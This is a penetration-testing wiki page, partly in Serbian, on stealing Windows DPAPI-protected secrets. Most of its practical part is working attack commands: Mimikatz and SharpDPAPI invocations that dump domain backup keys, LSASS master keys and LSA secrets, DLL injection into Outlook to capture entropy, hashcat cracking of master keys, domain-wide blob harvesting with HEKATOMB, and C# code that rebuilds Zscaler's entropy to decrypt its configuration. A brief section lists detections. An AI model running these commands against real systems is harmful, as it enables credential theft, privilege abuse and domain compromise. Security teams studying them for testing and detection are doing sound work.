# DPAPI - Ekstrakcija lozinki

{{#include ../../banners/hacktricks-training.md}}



## Šta je DPAPI

The Data Protection API (DPAPI) is primarily utilized within the Windows operating system for the **symmetric encryption of asymmetric private keys**, leveraging either user or system secrets as a significant source of entropy. This approach simplifies encryption for developers by enabling them to encrypt data using a key derived from the user's logon secrets or, for system encryption, the system's domain authentication secrets, thus obviating the need for developers to manage the protection of the encryption key themselves.

The most common way to use DPAPI is through the **`CryptProtectData` and `CryptUnprotectData`** functions, which allow applications to encrypt and decrypt data securely with the session of the process that is currently logged on. This means that the encrypted data can only be decrypted by the same user or system that encrypted it.

Moreover, these functions accepts also an **`entropy` parameter** which will also be used during encryption and decryption, therefore, in order to decrypt something encrypted using this parameter, you must provide the same entropy value that was used during encryption.

### Generisanje korisničkog ključa

The DPAPI generates a unique key (called **`pre-key`**) for each user based on their credentials. This key is derived from the user's password and other factors and the algorithm depends on the type of user but ends being a SHA1. For example, for domain users, **it depends on the NTLM hash of the user**.

This is specially interesting because if an attacker can obtain the user's password hash, they can:

- **Decrypt any data that was encrypted using DPAPI** with that user's key without needing to contact any API
- Try to **crack the password** offline trying to generate the valid DPAPI key

Moreover, every time some data is encrypted by a user using DPAPI, a new **master key** is generated. This master key is the one actually used to encrypt data. Each master key is given with a **GUID** (Globally Unique Identifier) that identifies it.

The master keys are stored in the **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** directory, where `{SID}` is the Security Identifier of that user. The master key is stored encrypted by the user's **`pre-key`** and also by a **domain backup key** for recovery (so the same key is stored encrypted 2 times by 2 different pass).

Note that the **domain key used to encrypt the master key is in the domain controllers and never changes**, so if an attacker has access to the domain controller, they can retrieve the domain backup key and decrypt the master keys of all users in the domain.

The encrypted blobs contain the **GUID of the master key** that was used to encrypt the data inside its headers.

> [!TIP]
> DPAPI encrypted blobs starts with **`01 00 00 00`**

Pronađite master ključeve:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Machine/System key generation

Ovo je ključ koji mašina koristi za enkripciju podataka. Baziran je na **DPAPI_SYSTEM LSA secret**, koji je poseban ključ kojem može pristupiti samo SYSTEM korisnik. Ovaj ključ se koristi za enkriptovanje podataka kojima sam sistem treba da pristupi, kao što su kredencijali na nivou mašine ili sistemske tajne.

Imajte na umu da ovi ključevi **nemaju rezervnu kopiju na domenu** pa su dostupni samo lokalno:

- **Mimikatz** može pristupiti tako što će dump-ovati LSA secrets koristeći komandu: `mimikatz lsadump::secrets`
- Tajna je smeštena u registru, pa administrator može **izmeniti DACL dozvole da bi joj pristupio**. Putanja u registru je: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### Protected Data by DPAPI

Među ličnim podacima koje štiti DPAPI su:

- Windows kredencijali
- šifre i podaci za automatsko popunjavanje Internet Explorera i Google Chrome-a
- šifre za e-mail i interne FTP naloge u aplikacijama kao što su Outlook i Windows Mail
- šifre za deljene foldere, resurse, bežične mreže i Windows Vault, uključujući ključeve za enkripciju
- šifre za remote desktop konekcije, .NET Passport i privatne ključeve za razne enkripcijske i autentifikacione svrhe
- mrežne lozinke koje upravlja Credential Manager i lični podaci u aplikacijama koje koriste CryptProtectData, kao što su Skype, MSN messenger i slično
- enkriptovani blob-ovi unutar registra
- ...

Sistemski zaštićeni podaci uključuju:
- WiFi lozinke
- lozinke za zakazane zadatke
- ...

### Master key extraction options

- Ako korisnik ima privilegije domenskog administratora, može pristupiti **ključu za rezervnu kopiju domena** kako bi dešifrovao sve korisničke master ključeve u domenu:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Sa lokalnim administratorskim privilegijama moguće je **pristupiti LSASS memoriji** i izvući DPAPI master ključeve svih povezanih korisnika i SYSTEM ključ.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Ako korisnik ima lokalne administratorske privilegije, može pristupiti **DPAPI_SYSTEM LSA secret** kako bi dekriptovao glavne ključeve mašine:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Ako su password ili hash NTLM korisnika poznati, možete **decrypt the master keys of the user directly**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Ako ste u sesiji kao korisnik, moguće je zatražiti od DC-a **backup key to decrypt the master keys using RPC**. Ako ste local admin i korisnik je prijavljen, možete **steal his session token** za ovo:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Lista Vault-a
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Pristup DPAPI šifrovanim podacima

### Pronalaženje DPAPI šifrovanih podataka

Uobičajeni **zaštićeni fajlovi** korisnika nalaze se u:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Takođe proverite zamenu `\Roaming\` sa `\Local\` u gore navedenim putanjama.

Primeri enumeracije:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) može pronaći DPAPI šifrovane blobove u fajl sistemu, registry-ju i B64 blobovima:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Imajte na umu da [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (iz istog repozitorijuma) može da se koristi za dešifrovanje DPAPI-om zaštićenih osetljivih podataka, kao što su cookies.

### Pristupni ključevi i podaci

- **Use SharpDPAPI** za dobijanje kredencijala iz DPAPI-šifrovanih fajlova iz trenutne sesije:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Dohvati informacije o credentials** kao što su encrypted data i guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

Dekriptirajte masterkey korisnika koji zahteva **domain backup key** koristeći RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Alat **SharpDPAPI** takođe podržava ove argumente za dešifrovanje masterkey-a (obratite pažnju da je moguće koristiti `/rpc` za preuzimanje domain backup key-a, `/password` za korišćenje plaintext password-a, ili `/pvk` za navođenje DPAPI domain private key fajla...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Dešifrujte podatke koristeći masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Alat **SharpDPAPI** takođe podržava ove argumente za dešifrovanje `credentials|vaults|rdg|keepass|triage|blob|ps` (napomena: moguće je koristiti `/rpc` da se dobije rezervni ključ domena, `/password` da se koristi lozinka u plaintextu, `/pvk` da se navede fajl privatnog ključa DPAPI domena, `/unprotect` da se iskoristi trenutna korisnička sesija...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Dekriptiraj neke podatke koristeći **trenutnu korisničku sesiju**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### Rukovanje opcionom entropijom ("Third-party entropy")

Neke aplikacije prosleđuju dodatnu vrednost **entropije** funkciji `CryptProtectData`. Bez ove vrednosti blob se ne može dešifrovati, čak i ako je poznat ispravan masterkey. Dobijanje entropije je stoga neophodno kada se ciljaju kredencijali zaštićeni na ovaj način (npr. Microsoft Outlook, neki VPN klijenti).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) je user-mode DLL koji hook-uje DPAPI funkcije unutar ciljanog procesa i transparentno snima svaku opcionu entropiju koja je prosleđena. Pokretanje EntropyCapture u **DLL-injection** režimu protiv procesa kao što su `outlook.exe` ili `vpnclient.exe` generisaće fajl koji mapira svaki entropy buffer na pozivajući proces i blob. Uhvaćena entropija se kasnije može proslediti **SharpDPAPI** (`/entropy:`) ili **Mimikatz** (`/entropy:<file>`) kako bi se podaci dešifrovali.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft je uveo **context 3** masterkey format počevši od Windows 10 v1607 (2016). `hashcat` v6.2.6 (December 2023) je dodao hash-modes **22100** (DPAPI masterkey v1 context), **22101** (context 1) i **22102** (context 3), što omogućava GPU-accelerated cracking of user passwords directly from the masterkey file. Napadači stoga mogu izvoditi word-list ili brute-force napade bez interakcije sa ciljnim sistemom.

`DPAPISnoop` (2024) automatizuje proces:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Alat takođe može da parsira Credential i Vault blobs, dekriptuje ih pomoću cracked keys i izveze cleartext passwords.

### Pristup podacima druge mašine

U **SharpDPAPI and SharpChrome** možete navesti opciju **`/server:HOST`** da pristupite podacima udaljene mašine. Naravno, morate moći da pristupite toj mašini, i u sledećem primeru se pretpostavlja da je **domain backup encryption key is known**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Ostali alati

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) je alat koji automatski izvlači sve korisnike i računare iz LDAP direktorijuma i izvlači domain controller backup key kroz RPC. Skripta će potom rešiti IP adrese svih računara i pokrenuti smbclient na svim računarima da bi preuzela sve DPAPI blob-ove svih korisnika i dešifrovala sve pomoću domain backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Sa listom računara izvađenom iz LDAP-a možete pronaći svaku podmrežu čak i ako ih niste znali!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) može automatski izvući tajne zaštićene DPAPI. Verzija 2.x je uvela:

* Paralelno prikupljanje blob-ova sa stotina hostova
* Parsiranje **context 3** masterkey-jeva i automatska integracija sa Hashcat cracking-om
* Podršku za Chrome "App-Bound" enkriptovane cookies (vidi sledeći odeljak)
* Novi **`--snapshot`** mod za periodično ispitivanje endpoint-a i diff novokreiranih blob-ova

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) je C# parser za masterkey/credential/vault fajlove koji može da izbacuje formate za Hashcat/JtR i opciono automatski pokreće cracking. Potpuno podržava machine i user masterkey formate do Windows 11 24H1.

## Uobičajene detekcije

- Pristup fajlovima u `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` i drugim DPAPI-povezanim direktorijumima.
- Posebno sa network share-a kao što su **C$** ili **ADMIN$**.
- Upotreba **Mimikatz**, **SharpDPAPI** ili sličnih alata za pristup LSASS memoriji ili dump-ovanje masterkey-jeva.
- Događaj **4662**: *An operation was performed on an object* – može se korelisati sa pristupom objektu **`BCKUPKEY`**.
- Događaj **4673/4674** kada proces zahteva *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### 2023-2025 ranjivosti i promene u ekosistemu

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (novembar 2023). Napadač sa mrežnim pristupom mogao je prevariti članicu domena da preuzme zlonamerni DPAPI backup key, omogućavajući dešifrovanje korisničkih masterkey-jeva. Ispravljeno u kumulativnom ažuriranju iz novembra 2023 — administratori treba da osiguraju da su DC-ovi i radne stanice potpuno zakrpljeni.
* **Chrome 127 “App-Bound” cookie encryption** (jul 2024) zamenio je nasleđenu DPAPI-only zaštitu dodatnim ključem koji se čuva u korisnikovom **Credential Manager**. Offline dešifrovanje kolačića sada zahteva i DPAPI masterkey i **GCM-wrapped app-bound key**. SharpChrome v2.3 i DonPAPI 2.x mogu da povrate dodatni ključ kada se pokreću u korisničkom kontekstu.

### Studija slučaja: Zscaler Client Connector – Custom Entropy izvedena iz SID

Zscaler Client Connector čuva nekoliko konfiguracionih fajlova pod `C:\ProgramData\Zscaler` (npr. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Svaki fajl je enkriptovan sa **DPAPI (Machine scope)**, ali vendor obezbeđuje **custom entropy** koja se *izračunava u runtime-u* umesto da bude sačuvana na disku.

Entropija se rekonstruiše iz dva elementa:

1. Hard-kodovani tajni podatak ugrađen unutar `ZSACredentialProvider.dll`.
2. **SID** Windows naloga kojem konfiguracija pripada.

Algoritam koji DLL implementira je ekvivalentan:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Pošto je tajna ugrađena u DLL koji se može pročitati sa diska, **bilo koji lokalni napadač sa SYSTEM privilegijama može ponovo generisati entropiju za bilo koji SID** i decrypt the blobs offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Dešifrovanje daje kompletnu JSON konfiguraciju, uključujući svaki **device posture check** i njegovu očekivanu vrednost — informacije koje su veoma vredne pri pokušajima zaobilaženja na klijentskoj strani.

> SAVET: drugi šifrovani artefakti (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) su zaštićeni sa DPAPI **bez** entropije (`16` zero bytes). Stoga se mogu direktno dešifrovati pomoću `ProtectedData.Unprotect` jednom kada se dobiju SYSTEM privilegije.

## Reference

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
